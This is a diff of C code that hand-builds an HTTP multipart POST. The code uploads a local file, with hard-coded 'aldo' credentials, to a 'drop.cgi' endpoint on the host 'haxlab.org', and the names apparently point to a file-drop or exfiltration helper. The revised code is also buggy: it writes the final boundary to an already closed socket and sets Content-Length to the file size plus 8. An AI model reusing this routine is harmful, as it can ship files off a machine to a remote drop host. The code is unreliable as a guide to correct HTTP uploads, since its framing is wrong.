@@ -118,11 +118,17 @@ int Connect(char *hostname, int port)
     return 0;
 }
 
-#define REMOTE_URL "http://haxlab.org/drop.cgi"
+#define REMOTE_URI "/drop.cgi"
 #define REMOTE_HOST "haxlab.org"
 #define REMOTE_PORT 80
 
 const char *boundary = "--------------------56739374637362";
+
+ssize_t Write(int sock, char *buf, int len)
+{
+    printf("%s", buf);
+    return write(sock, buf, len);
+}
 
 void Content_Disposition(int sock, char *name, char *value, int len, char *filename)
 {
@@ -130,10 +136,9 @@ void Content_Disposition(int sock, char *name, char *value, int len, char *filen
     char content[8192] = { 0 };
     snprintf(content_disposition, sizeof(content_disposition), "Content-Disposition: form-data; name=\"%s\"\r\n\r\n", name);
     snprintf(content, sizeof(content),  "%s\r\n%s\r\n", value, boundary);
-    printf(content_disposition);
-    write(sock, content_disposition, strlen(content_disposition));
-    write(sock, content, strlen(content));
-    printf(content);
+    
+    Write(sock, content_disposition, strlen(content_disposition));
+    Write(sock, content, strlen(content));
 }
 
 bool HTTP_Post_File(char *path)
@@ -162,37 +167,50 @@ bool HTTP_Post_File(char *path)
     }
 #define CHUNK 1024
 
-    char buf[CHUNK + 1] = { 0 };
+    char buffer[CHUNK + 1] = { 0 };
     
     int size = fstats.st_size;
     int total = 0;
     
     char method[1024] = { 0 };
-    snprintf(method, sizeof(method), "POST %s HTTP/1.1\r\n", REMOTE_URL);
+    snprintf(method, sizeof(method), "POST %s HTTP/1.1\r\n", REMOTE_URI);
+    Write(sock, method, strlen(method));
+    
     char host[1024] = { 0 };
     snprintf(host, sizeof(host),"Host: %s\r\n", REMOTE_HOST);
+    Write(sock, host, strlen(host));
     
-    write(sock, method, strlen(method));
-    write(sock, host, strlen(host));
-    
-    char content_type[1024] = { 0 };
-    snprintf(content_type, sizeof(content_type), "Content-Type: application/form-data; boundary=%s\r\n", boundary);
-    
-    write(sock, content_type, strlen(content_type));
+    int length = size + 8;
     
     char content_length[1024] = { 0 };
-    snprintf(content_length, sizeof(content_length), "Content-Length: %d\r\n\r\n", size);
+    snprintf(content_length, sizeof(content_length), "Content-Length: %d\r\n", length);
+    Write(sock, content_length, strlen(content_length));
+    
+    char content_type[1024] = { 0 };
+    snprintf(content_type, sizeof(content_type), "Content-Type: multipart/form-data; boundary=%s\r\n", boundary);
+    Write(sock, content_type, strlen(content_type));
+    
+    
+    char split[1024] = { 0 };
+    snprintf(split, sizeof(split), "%s\r\n",boundary);
+    Write(sock, split, strlen(split));
     
     Content_Disposition(sock, "username", "aldo", 0, NULL);
+    Content_Disposition(sock, "password", "aldo", 0, NULL);
+    char buf[8192] = { 0 };
     
-    write(sock, content_length, strlen(content_length));
+    snprintf(buf, sizeof(buf), "Content-Disposition: form-data; name=\"filename\"; filename=\"a.sex\"\r\n");
+    Write(sock, buf, strlen(buf));
+    
+    snprintf(buf, sizeof(buf), "Content-Type: multipart/mixed\r\n\r\n");
+    Write(sock, buf, strlen(buf));
     
     while (size)
     {
         while (1)
         {
-            int count = fread(buf, 1, CHUNK, f);
-            int bytes = write(sock, buf, count);
+            int count = fread(buffer, 1, CHUNK, f);
+            int bytes = Write(sock, buffer, count);
             if (bytes == 0)
             {
                 break;
@@ -207,6 +225,10 @@ bool HTTP_Post_File(char *path)
     
     close(sock);
     fclose(f);
+    
+    
+    snprintf(split, sizeof(split), "\r\n%s\r\n\r\n",boundary);
+    Write(sock, split, strlen(split));
     
     printf("http post done %s\n\n", path);
     
